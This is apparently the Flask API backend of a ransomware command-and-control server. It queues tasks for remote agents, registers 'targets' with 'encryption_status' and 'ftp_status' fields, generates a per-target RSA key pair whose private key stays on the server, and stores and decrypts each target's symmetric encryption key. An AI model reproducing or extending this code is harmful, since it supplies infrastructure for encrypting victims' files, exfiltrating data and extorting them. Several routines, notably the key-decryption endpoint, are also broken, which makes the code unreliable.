import uuid
import json

from flask import request, Response
from flask_restful import Resource
from datetime import datetime
from database.models import Task, Result, Target, Key
from database.db import db
from config import encryption_statuses
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend

class Tasks(Resource):
    def get(self):
        tasks = Task.query.all()
        task_json = []
        for task in tasks:
            task_json.append(task.to_dict())
        return Response(json.dumps(task_json), mimetype="application/json", status=200)
    
    def post(self):
        body = request.get_json()
        num_objs = len(body)
        
        if isinstance(body, dict):
            obj = body
            obj['task_id'] = str(uuid.uuid4())
            new_task = Task(**obj)
            db.session.add(new_task)

            db.session.commit()
        else:
            print("Received body is not a dict:", type(body))
            return Response("Invalid JSON", status=400)
        
        added_tasks = Task.query.order_by(Task.id.desc()).limit(num_objs).all()
        added_tasks_json = []
        for task in added_tasks:
            added_tasks_json.append(task.to_dict())
            
        return Response(json.dumps(added_tasks_json), mimetype="application/json", status=200)

class Results(Resource):
    def get(self):
        results = Result.query.all()
        results_json = []
        for result in results:
            results_json.append(result.to_dict())
        return Response(json.dumps(results_json), mimetype="application/json", status=200)
    
    def post(self):
        body = json.loads(request.get_json())

        if isinstance(body, list):
            for entry in body:
                if isinstance (entry, dict):
                    entry['result_id'] = str(uuid.uuid4())
                    entry['success'] = 1 if entry['success'] else 0
                    new_result = Result(**entry)
                    db.session.add(new_result)
                    db.session.commit()
        else:
            print("Received body is not a list:", type(body))
            return Response("Invalid JSON", status=400)
        
        tasks = Task.query.all()
        tasks_json = []
        for task in tasks:
            tasks_json.append(task.to_dict())
        
        db.session.query(Task).delete()
        db.session.commit()
        print(tasks_json)
        print(len(tasks_json))
        if len(tasks_json) == 0:
            return Response(json.dumps([]), mimetype="application/json", status=204)
        return Response(json.dumps(tasks_json), mimetype="application/json", status=200)

class Targets(Resource):
    def get(self):
        results = Target.query.all()
        results_json = []
        
        for result in results:
            results_json.append(result.to_dict())
        
        return Response(json.dumps(results_json), mimetype="application/json", status=200)
    
    def post(self):
        body = request.get_json()
        
        print(body)
        print(type(body))
        
        if isinstance(body, dict):
            try:
                # Add Target keys to db
                private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
                public_key = private_key.public_key()
                
                private_key_pem = private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption()
                )
                
                public_key_pem = public_key.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                )
                
                private_key_pem_str = private_key_pem.decode('utf-8')
                public_key_pem_str = public_key_pem.decode('utf-8')
                
                body['target_id'] = str(uuid.uuid4())
                body['public_key'] = public_key_pem_str
                body['last_connect'] = str(datetime.now())
                body['ftp_status'] = 'false'
                body['encryption_status'] = encryption_statuses['ready']
                new_result = Target(**body)
                db.session.add(new_result)
                db.session.commit()
                
                keys = {
                    'target_id': body['target_id'],
                    'private_key': private_key_pem_str,
                    'public_key': public_key_pem_str
                }
                
                new_key = Key(**keys)
                db.session.add(new_key)
                db.session.commit()
            except Exception as e:
                db.session.rollback()
                print(e)
                return Response({'error': e}, mimetype='application/json', status=500)
        else:
            print("Received body is not a dict:", type(body))
            return Response("Invalid JSON", status=400)
        
        added = Target.query.order_by(Target.id.desc()).first().to_dict()
        
        if added is None:
            return Response(json.dumps({'error': 'No targets found'}), mimetype='application/json', status = 204)
            
        return Response(added, mimetype="application/json", status=200)

    def put(self):
        body = request.get_json()
        target = Target.query.filter_by(ip=body['ip']).first()
        
        if not body or 'ip' not in body:
            return Response({"error": "Invalid request"}, mimetype="application/json", status=400)
        
        if target is None:
            return Response({"error": "Target not found"}, mimetype="application/json", status=404)
        
        
        for key, value in body.items():
            setattr(target, key, value)
        
        target = Target.query.filter_by(ip=body['ip']).first()
        print(target)
        print(target.to_dict()['last_connect'])
        
        db.session.commit()
        return Response(json.dumps(target.to_dict()), mimetype="application/json", status=200)

class Keys(Resource):
    def get(self):
        body = request.get_json()
        results = Key.query.all()
        key_data = None
        
        for result in results:
            if result['target_id'] == body['target_id']:
                key_data = result
            
        # decrypt key
        c_sym = result.decrypt(
            result['symmetric_key'],
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        return Response(json.dumps({'key': c_sym}), mimetype="application/json", status=200)
        
    def put(self):
        body = request.get_json()
        
        if not body or 'target_id' not in body or 'symmetric_key' not in body:
            return Response({"error": "Invalid request"}, mimetype="application/json", status=400)
        
        target = Key.query.filter_by(target_id=body['target_id']).first()
        
        if target is None:
            return Response({"error": "Target not found"}, mimetype="application/json", status=404)
        
        target['symmetric_key'] = body['symmetric_key']
        
        db.session.commit()
        return Response(json.dumps({'success!': 'symmetric key added'}), mimetype="application/json", status=200)